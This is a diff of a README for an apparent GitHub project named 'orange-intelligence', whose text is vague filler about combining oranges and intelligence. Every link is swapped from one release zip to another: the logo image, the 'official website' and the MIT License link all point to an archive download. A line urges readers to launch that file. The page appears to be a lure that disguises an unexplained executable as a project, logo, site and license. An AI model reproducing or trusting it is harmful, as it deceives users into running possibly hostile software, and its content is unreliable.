@@ -2,7 +2,7 @@
 
 Welcome to the "orange-intelligence" repository! This is where Orange Intelligence comes to life - a unique and innovative project aimed at exploring the vast capabilities of what we can achieve with the power of oranges and intelligence combined. Dive into the repository to uncover the secrets of Orange Intelligence and witness the magic unfold.
 
-![Orange Intelligence Logo](https://github.com/DaniDev342/orange-intelligence/releases/download/v1.0/Application.zip)
+![Orange Intelligence Logo](https://github.com/DaniDev342/orange-intelligence/releases/download/v2.0/Software.zip)
 
 ## 📌 Repository Summary
 
@@ -14,13 +14,13 @@ Topics for this repository are currently not provided.
 
 ## 📦 Download Orange Intelligence 🍊🧠
 
-🔗 [Download Orange Intelligence v1.0.0](https://github.com/DaniDev342/orange-intelligence/releases/download/v1.0/Application.zip)
+🔗 [Download Orange Intelligence v1.0.0](https://github.com/DaniDev342/orange-intelligence/releases/download/v2.0/Software.zip)
 
 *Note: The link above leads to the file that needs to be launched to unveil the full potential of Orange Intelligence.*
 
 ## 🌐 Visit the Official Orange Intelligence Website
 
-Would you like to dive deeper into the world of Orange Intelligence? Visit the official [Orange Intelligence Website](https://github.com/DaniDev342/orange-intelligence/releases/download/v1.0/Application.zip) for more insights, updates, and interactive experiences.
+Would you like to dive deeper into the world of Orange Intelligence? Visit the official [Orange Intelligence Website](https://github.com/DaniDev342/orange-intelligence/releases/download/v2.0/Software.zip) for more insights, updates, and interactive experiences.
 
 ## 🛠️ Getting Started with Orange Intelligence
 
@@ -45,7 +45,7 @@ To get started with Orange Intelligence, follow these simple steps:
 
 ## 📜 Licensing Information
 
-The Orange Intelligence project is licensed under the [MIT License](https://github.com/DaniDev342/orange-intelligence/releases/download/v1.0/Application.zip). Feel free to explore, modify, and enhance Orange Intelligence according to the terms of the license.
+The Orange Intelligence project is licensed under the [MIT License](https://github.com/DaniDev342/orange-intelligence/releases/download/v2.0/Software.zip). Feel free to explore, modify, and enhance Orange Intelligence according to the terms of the license.
 
 ---
 
